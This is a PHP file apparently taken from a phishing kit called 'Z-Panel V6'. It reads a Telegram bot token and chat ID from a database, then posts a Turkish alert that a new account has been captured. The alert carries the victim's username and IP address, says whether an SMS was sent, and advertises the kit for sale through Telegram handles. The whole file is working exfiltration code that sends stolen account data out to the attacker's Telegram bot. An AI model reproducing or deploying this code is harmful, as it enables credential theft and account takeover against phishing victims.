<?php 
include ("app/config.php");
$cektok=$spexcon->query("SELECT * FROM bot");
$cikti=$cektok->fetch_assoc();
$token = $cikti['token'];
$chat = $cikti['chat'];
$parametre= array(
'chat_id' => $chat,
'text' => "
Z-Panel V6 Hesap Verileri :)

!Yeni Hesap Düştü Lütfen Panelden
Kontrol Ediniz!

Username   => $username
IP Adresi  => $ip
Panele Yazıldımı   => Evet
SMS Gönderildi mi  => Evet

Satın Almak İçin @SanaHasret/@spexcoder
",
);
$ch = curl_init();
$url = "https://api.telegram.org/bot".$token."/sendmessage";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $parametre);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);

?>